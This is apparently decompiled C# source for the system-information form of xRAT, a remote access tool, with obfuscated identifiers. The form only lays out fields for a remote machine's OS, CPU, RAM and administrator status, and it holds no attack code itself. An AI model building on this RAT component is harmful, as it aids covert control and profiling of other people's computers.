namespace xRAT
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class SysInfo : Form
    {
        [AccessedThroughProperty("exitbtn")]
        private Button _exitbtn;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("Label5")]
        private Label _Label5;
        [AccessedThroughProperty("Label6")]
        private Label _Label6;
        [AccessedThroughProperty("Label7")]
        private Label _Label7;
        [AccessedThroughProperty("Label8")]
        private Label _Label8;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        [AccessedThroughProperty("TextBox6")]
        private TextBox _TextBox6;
        [AccessedThroughProperty("TextBox7")]
        private TextBox _TextBox7;
        [AccessedThroughProperty("TextBox5")]
        private TextBox daxawBwCf;
        private IContainer icontainer_0;

        public SysInfo()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.SysInfo_Load);
            this.InitializeComponent();
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void exitbtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(SysInfo));
            this.exitbtn = new Button();
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.Label3 = new Label();
            this.TextBox1 = new TextBox();
            this.TextBox2 = new TextBox();
            this.TextBox3 = new TextBox();
            this.TextBox4 = new TextBox();
            this.Label4 = new Label();
            this.TextBox5 = new TextBox();
            this.Label5 = new Label();
            this.TextBox6 = new TextBox();
            this.Label6 = new Label();
            this.Label7 = new Label();
            this.TextBox7 = new TextBox();
            this.Label8 = new Label();
            this.PictureBox1 = new PictureBox();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            Point point = new Point(0x101, 0x115);
            this.exitbtn.Location = point;
            this.exitbtn.Name = "exitbtn";
            Size size = new Size(0x4e, 0x18);
            this.exitbtn.Size = size;
            this.exitbtn.TabIndex = 5;
            this.exitbtn.Text = "&Close";
            this.exitbtn.UseVisualStyleBackColor = true;
            this.Label1.AutoSize = true;
            this.Label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 9);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            size = new Size(0x6a, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 6;
            this.Label1.Text = "Operating System";
            this.Label2.AutoSize = true;
            this.Label2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0x2f);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x3f, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 7;
            this.Label2.Text = "Processor";
            this.Label3.AutoSize = true;
            this.Label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0x57);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(0x65, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 8;
            this.Label3.Text = "Number of Cores";
            this.TextBox1.BackColor = Color.White;
            this.TextBox1.BorderStyle = BorderStyle.None;
            point = new Point(15, 0x19);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            this.TextBox1.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 9;
            this.TextBox2.BackColor = Color.White;
            this.TextBox2.BorderStyle = BorderStyle.None;
            point = new Point(15, 0x40);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            this.TextBox2.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 10;
            this.TextBox3.BackColor = Color.White;
            this.TextBox3.BorderStyle = BorderStyle.None;
            point = new Point(15, 0x67);
            this.TextBox3.Location = point;
            this.TextBox3.Name = "TextBox3";
            this.TextBox3.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox3.Size = size;
            this.TextBox3.TabIndex = 11;
            this.TextBox4.BackColor = Color.White;
            this.TextBox4.BorderStyle = BorderStyle.None;
            point = new Point(15, 0x8e);
            this.TextBox4.Location = point;
            this.TextBox4.Name = "TextBox4";
            this.TextBox4.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox4.Size = size;
            this.TextBox4.TabIndex = 13;
            this.Label4.AutoSize = true;
            this.Label4.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0x7e);
            this.Label4.Location = point;
            this.Label4.Name = "Label4";
            size = new Size(0x45, 13);
            this.Label4.Size = size;
            this.Label4.TabIndex = 12;
            this.Label4.Text = "Video Card";
            this.TextBox5.BackColor = Color.White;
            this.TextBox5.BorderStyle = BorderStyle.None;
            point = new Point(15, 0xb5);
            this.TextBox5.Location = point;
            this.TextBox5.Name = "TextBox5";
            this.TextBox5.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox5.Size = size;
            this.TextBox5.TabIndex = 15;
            this.Label5.AutoSize = true;
            this.Label5.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0xa5);
            this.Label5.Location = point;
            this.Label5.Name = "Label5";
            size = new Size(0x71, 13);
            this.Label5.Size = size;
            this.Label5.TabIndex = 14;
            this.Label5.Text = "Windows Directory";
            this.TextBox6.BackColor = Color.White;
            this.TextBox6.BorderStyle = BorderStyle.None;
            point = new Point(15, 220);
            this.TextBox6.Location = point;
            this.TextBox6.Name = "TextBox6";
            this.TextBox6.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox6.Size = size;
            this.TextBox6.TabIndex = 0x11;
            this.Label6.AutoSize = true;
            this.Label6.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0xcc);
            this.Label6.Location = point;
            this.Label6.Name = "Label6";
            size = new Size(0x41, 13);
            this.Label6.Size = size;
            this.Label6.TabIndex = 0x10;
            this.Label6.Text = "Max. RAM";
            this.Label7.AutoSize = true;
            point = new Point(0x25, 0x11b);
            this.Label7.Location = point;
            this.Label7.Name = "Label7";
            size = new Size(0x49, 13);
            this.Label7.Size = size;
            this.Label7.TabIndex = 0x12;
            this.Label7.Text = "Please wait...";
            this.TextBox7.BackColor = Color.White;
            this.TextBox7.BorderStyle = BorderStyle.None;
            point = new Point(15, 0x102);
            this.TextBox7.Location = point;
            this.TextBox7.Name = "TextBox7";
            this.TextBox7.ReadOnly = true;
            size = new Size(320, 14);
            this.TextBox7.Size = size;
            this.TextBox7.TabIndex = 0x15;
            this.Label8.AutoSize = true;
            this.Label8.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            point = new Point(12, 0xf2);
            this.Label8.Location = point;
            this.Label8.Name = "Label8";
            size = new Size(0xa5, 13);
            this.Label8.Size = size;
            this.Label8.TabIndex = 20;
            this.Label8.Text = "Has Administrator Privileges";
            this.PictureBox1.Image = Class5.smethod_49();
            point = new Point(15, 0x11a);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x10, 0x10);
            this.PictureBox1.Size = size;
            this.PictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox1.TabIndex = 0x13;
            this.PictureBox1.TabStop = false;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.White;
            size = new Size(0x15b, 310);
            this.ClientSize = size;
            this.Controls.Add(this.TextBox7);
            this.Controls.Add(this.Label8);
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.Label7);
            this.Controls.Add(this.TextBox6);
            this.Controls.Add(this.Label6);
            this.Controls.Add(this.TextBox5);
            this.Controls.Add(this.Label5);
            this.Controls.Add(this.TextBox4);
            this.Controls.Add(this.Label4);
            this.Controls.Add(this.TextBox3);
            this.Controls.Add(this.TextBox2);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.Label3);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.exitbtn);
            this.FormBorderStyle = FormBorderStyle.Fixed3D;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "SysInfo";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "System Information";
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void SysInfo_Load(object sender, EventArgs e)
        {
            IEnumerator enumerator;
            try
            {
                enumerator = this.Controls.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
                    if (objectValue.ToString().Contains("TextBox"))
                    {
                        NewLateBinding.LateSet(objectValue, null, "Text", new object[] { null }, null, null);
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable)
                {
                    (enumerator as IDisposable).Dispose();
                }
            }
            this.PictureBox1.Visible = true;
            this.Label7.Visible = true;
        }

        internal virtual Button exitbtn
        {
            get
            {
                return this._exitbtn;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.exitbtn_Click);
                if (this._exitbtn != null)
                {
                    this._exitbtn.Click -= handler;
                }
                this._exitbtn = value;
                if (this._exitbtn != null)
                {
                    this._exitbtn.Click += handler;
                }
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this._Label3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label3 = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return this._Label4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label4 = value;
            }
        }

        internal virtual Label Label5
        {
            get
            {
                return this._Label5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label5 = value;
            }
        }

        internal virtual Label Label6
        {
            get
            {
                return this._Label6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label6 = value;
            }
        }

        internal virtual Label Label7
        {
            get
            {
                return this._Label7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label7 = value;
            }
        }

        internal virtual Label Label8
        {
            get
            {
                return this._Label8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label8 = value;
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox2 = value;
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return this._TextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox3 = value;
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return this._TextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox4 = value;
            }
        }

        internal virtual TextBox TextBox5
        {
            get
            {
                return this.daxawBwCf;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.daxawBwCf = value;
            }
        }

        internal virtual TextBox TextBox6
        {
            get
            {
                return this._TextBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox6 = value;
            }
        }

        internal virtual TextBox TextBox7
        {
            get
            {
                return this._TextBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox7 = value;
            }
        }
    }
}

